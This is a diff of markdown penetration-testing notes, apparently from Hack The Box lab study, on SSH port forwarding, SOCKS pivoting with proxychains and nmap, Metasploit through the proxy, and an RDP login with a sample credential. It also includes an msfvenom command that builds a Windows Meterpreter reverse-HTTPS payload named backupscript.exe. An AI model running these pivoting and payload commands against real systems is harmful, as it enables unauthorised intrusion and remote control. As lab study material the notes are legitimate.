@@ -994,42 +994,52 @@ office2john.py Protected.docx > protected-docx.hash
 ##### Dynamic Port Forwarding with SSH and SOCKS Tunneling
 ```
 # netstat -r or ip route.
-# Executing the Local Port Forward
+# Executing the Local Port Forward:---> We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port
 ssh -L AnyLocalPort:localhost:DestinationPort username@DestinationIP
+ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64  --> Forwarding Multiple Ports
+
 ssh -L localhost:AnyLocalPort:DestinationIP:DestinationPort username@<JUmServerIP/MIddleServerIP>
 ssh -L AnyLocalPort:localhost:DestinationPort -L AnyLocalPort2:localhost:DestinationPort2 username@DestinationIP
 
 # To Verifiy the local port forwarding
 netstat -antp | grep 1234
 nmap -v -sV -pLocalPort localhost
+```
 
-# Enabling Dynamic Port Forwarding with SSH
-ssh -D AnyLocalPort username@DestinationIP
+##### Scan another hosts, on different network (via dynamic port forwarding and ( Socks listener on local port like 9050 and proxy to send packages and nmap requests)
+<img width="2108" height="1184" alt="22" src="https://github.com/user-attachments/assets/aa4019a7-fc9f-497f-b9c7-d537936f17f3" />
 
-# Checking /etc/proxychains.conf
+
+```
+# Enabling Dynamic Port Forwarding with SSH:---> dynamic port forwarding, where we can send packets to a remote network via a pivot host.
+1) ssh -D AnyLocalPort(9050) username@DestinationIP
+2) Checking /etc/proxychains.conf
 tail -4 /etc/proxychains.conf
-# meanwile
-# defaults set to "tor"
-socks4 	127.0.0.1 9050
-
-# Using Nmap with Proxychains
-proxychains nmap -v -sn 172.16.5.1-200
-
-# Enumerating the Windows Target through Proxychains
-proxychains nmap -v -Pn -sT 172.16.5.19
-proxychains4 -f /home/kali/recon/proxychains.conf nmap -v -Pn -sT 172.16.5.19
-
+	# meanwile
+	# defaults set to "tor"
+	socks4 	127.0.0.1 9050
+	
+# Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
+3) Using Nmap with Proxychains (SOCKS tunneling
+	proxychains nmap -v -sn 172.16.5.1-200
+	
+	# Enumerating the Windows Target through Proxychains (Windows Defender firewall blocks ICMP requests (traditional pings) by default.)
+	proxychains nmap -v -Pn -sT 172.16.5.19
+	proxychains4 -f /home/kali/recon/proxychains.conf nmap -v -Pn -sT 172.16.5.19
+	
 # Using Metasploit with Proxychains
 proxychains msfconsole
+msf6 > search rdp_scanner
+msf6 > use 0
 
 # Using xfreerdp with Proxychains
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 ```
-##### Remote/Reverse Port Forwarding with SSH
+##### Remote/Reverse Port Forwarding with SSH:--->  we might want to forward a local service to the remote port as well.
 ```
 #Creating a Windows Payload with msfvenom
-sword0x00@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 
 #Configuring & Starting the multi/handler
 use exploit/multi/handler
